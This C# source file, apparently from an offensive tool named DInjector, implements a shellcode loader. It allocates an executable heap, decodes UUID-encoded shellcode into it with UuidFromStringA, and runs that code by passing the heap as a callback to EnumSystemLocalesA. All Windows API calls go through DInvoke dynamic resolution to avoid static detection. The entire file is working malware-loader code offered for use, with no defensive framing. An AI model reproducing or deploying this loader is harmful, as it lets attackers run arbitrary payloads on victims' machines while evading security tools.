using System;
using System.Runtime.InteropServices;

using DI = DInvoke;

namespace DInjector
{
    class CurrentThreadUuid
    {
        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate IntPtr HeapCreate(
            uint flOptions,
            UIntPtr dwInitialSize,
            UIntPtr dwMaximumSize);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate IntPtr UuidFromStringA(
            string stringUuid,
            IntPtr heapPointer);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate bool EnumSystemLocalesA(
            IntPtr lpLocaleEnumProc,
            int dwFlags);

        private static IntPtr heapCreate(uint flOptions, UIntPtr dwInitialSize, UIntPtr dwMaximumSize)
        {
            object[] parameters = { flOptions, dwInitialSize, dwMaximumSize };
            var result = (IntPtr)DI.DynamicInvoke.Generic.DynamicAPIInvoke("kernel32.dll", "HeapCreate", typeof(HeapCreate), ref parameters);

            return result;
        }

        private static IntPtr uuidFromStringA(string stringUuid, IntPtr heapPointer)
        {
            object[] parameters = { stringUuid, heapPointer };
            var result = (IntPtr)DI.DynamicInvoke.Generic.DynamicAPIInvoke("rpcrt4.dll", "UuidFromStringA", typeof(UuidFromStringA), ref parameters);

            return result;
        }

        private static bool enumSystemLocalesA(IntPtr lpLocaleEnumProc, int dwFlags)
        {
            object[] parameters = { lpLocaleEnumProc, dwFlags };
            var result = (bool)DI.DynamicInvoke.Generic.DynamicAPIInvoke("kernel32.dll", "EnumSystemLocalesA", typeof(EnumSystemLocalesA), ref parameters);

            return result;
        }

        public static void Execute(string shellcodeUuids)
        {
            var concatedUuids = shellcodeUuids;

            #region HeapCreate

            var hHeap = heapCreate((uint)0x00040000, UIntPtr.Zero, UIntPtr.Zero);

            if (hHeap != null)
                Console.WriteLine("(CurrentThreadUuid) [+] HeapCreate");
            else
                Console.WriteLine("(CurrentThreadUuid) [-] HeapCreate:", hHeap.ToString("x2"));

            #endregion

            #region UuidFromStringA

            var uuids = concatedUuids.Split('|');
            IntPtr heapAddr = IntPtr.Zero;

            for (int i = 0; i < uuids.Length; i++)
            {
                heapAddr = IntPtr.Add(hHeap, 16 * i);
                var status = uuidFromStringA(uuids[i], heapAddr);
            }

            Console.WriteLine("(CurrentThreadUuid) [+] UuidFromStringA");

            #endregion

            #region EnumSystemLocalesA

            var result = enumSystemLocalesA(hHeap, 0);

            if (result)
                Console.WriteLine("(CurrentThreadUuid) [+] EnumSystemLocalesA");
            else
                Console.WriteLine("(CurrentThreadUuid) [-] EnumSystemLocalesA:");

            #endregion
        }
    }
}
